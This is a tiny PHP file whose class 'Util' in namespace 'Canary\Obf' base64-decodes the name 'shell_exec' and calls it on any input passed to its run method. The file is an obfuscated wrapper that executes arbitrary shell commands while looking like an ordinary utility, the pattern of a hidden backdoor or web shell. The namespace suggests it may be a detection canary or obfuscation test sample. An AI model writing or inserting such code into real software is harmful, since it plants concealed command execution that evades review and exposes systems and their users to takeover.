<?php
namespace Canary\Obf;
class Util {
    public static function run($x) {
        $f = base64_decode('c2hlbGxfZXhlYw==');
        return $f($x);
    }
}
